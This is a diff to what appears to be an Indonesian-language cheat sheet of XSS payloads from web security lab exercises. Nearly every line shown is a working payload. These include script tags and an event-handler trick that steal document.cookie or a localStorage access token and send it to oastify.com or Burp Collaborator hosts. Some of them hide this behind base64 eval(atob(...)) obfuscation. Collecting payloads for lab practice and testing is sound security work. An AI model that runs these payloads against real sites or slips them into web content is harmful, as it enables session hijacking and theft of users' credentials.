@@ -9,7 +9,7 @@
 
 **Payload** : 
 ```html
-<script>alert(1)</script> 
+	<script>alert(1)</script> 
 ```
 
 ### DOM XSS in document.write sink using source location.search
@@ -137,7 +137,9 @@ link tag canonical pada `<head>` memungkinkan terjadinya XSS dengan menambahkan 
 ```html
 <script>var i=new Image(); i.src="http://z99oqbqbw51wp1w0xw0fu7uau10soic7.oastify.com/?cookie="+btoa(document.cookie);</script>
 
-<script>eval(atob('dmFyIHhocj1uZXcgWE1MSHR0cFJlcXVlc3QoKTsKeGhyLm9wZW4oIkdFVCIsICJodHRwczovL3M2ejZqZGxydThoOHE2ajBlYWczeHhia3RiejJuN2J3Lm9hc3RpZnkuY29tLz8iK2xvY2FsU3RvcmFnZS5nZXRJdGVtKCdhY2Nlc3NfdG9rZW4nKSwgdHJ1ZSk7Cnhoci5zZW5kKCk7='))</script>
+<script>eval(atob('dmFyIHhocj1uZXcgWE1MSHR0cFJlcXVlc3QoKTsKeGhyLm9wZW4oIkdFVCIsICJodHRwczovL2c4cHp6b283amt0aXh5djZ3b3Z3dTR0N2t5cXBlbTJiLm9hc3RpZnkuY29tLz9hPSIrZG9jdW1lbnQuY29va2llLCB0cnVlKTsKeGhyLnNlbmQoKTs='))</script>
+
+<xss oncontentvisibilityautostatechange=eval(atob('dmFyIHhocj1uZXcgWE1MSHR0cFJlcXVlc3QoKTsKeGhyLm9wZW4oIkdFVCIsICJodHRwczovLzJ0d2xrYTl0NDZlNGlrZ3NoYWdpZnFldDVrYmN6Mm5yLm9hc3RpZnkuY29tLz9hPSIrZG9jdW1lbnQuY29va2llLCB0cnVlKTsKeGhyLnNlbmQoKTs=')) style=display:block;content-visibility:auto>
 
 <script> 
 fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { method: 'POST', mode: 'no-cors', body:document.cookie }); 
